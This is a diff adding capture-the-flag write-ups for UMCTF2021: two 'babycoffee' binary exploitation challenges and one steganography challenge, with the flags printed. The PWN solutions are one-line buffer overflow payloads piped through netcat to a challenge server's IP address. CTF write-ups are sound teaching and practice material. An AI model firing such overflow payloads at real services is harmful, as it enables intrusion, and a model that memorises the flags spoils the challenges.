@@ -75,3 +75,78 @@
 >手機拍片逐格睇
 > 
 > 
+
+----
+
+# PWN - UMCTF2021 - babycoffee-1
+
+- Write-Up Author: **Louis Lou**
+
+- Flag: **MOCSCTF{d0n7_l37_7h3m_pu7_700_much_c0ff33_w1ll_0v3rfl0w3d!!}**
+
+
+## **Question:**
+>**babycoffee-1**</br>
+>Author: **RB916120**
+
+>can you overflow the coffee?</br>
+>
+>nc 52.175.52.175 39001
+
+
+## **write-up:**
+
+>python2 -c "print 'A' * 100 + '\x44'" |  nc 52.175.52.175 39001
+> 
+>
+
+----
+
+# PWN - UMCTF2021 - babycoffee-2
+
+- Write-Up Author: **Louis Lou**
+
+- Flag: **MOCSCTF{d0_y0u_3nj0y_7h15_c7f_3v3n7?}**
+
+
+## **Question:**
+>**babycoffee-2**</br>
+>Author: **RB916120**
+
+>i would like to order a coffee..</br>
+>
+>nc 52.175.52.175 39002
+
+
+## **write-up:**
+
+>python2 -c "print 'A' * 32 + '\xBE\xBA\xFE\xCA'" | nc 52.175.52.175 39002
+> 
+>
+
+----
+
+# Forensic - UMCTF2021 - hide
+
+- Write-Up Author: **Louis Lou**
+
+- Flag: **mocsctf{c@n_y0u_f1nd_0ur_53cr3t?!}**
+
+
+## **Question:**
+>**hide**</br>
+>Author: **TeruLei**
+
+>hi,hi,hide in a pic~</br>
+>
+
+
+## **write-up:**
+
+>**Step 1.**
+>unzip hide.zip and goto onlinehexeditor search “ctf” find first part.</br>
+>
+>**Step 2.**
+>use https://stylesuxx.github.io/steganography/ find another part.</br>
+>
+> 
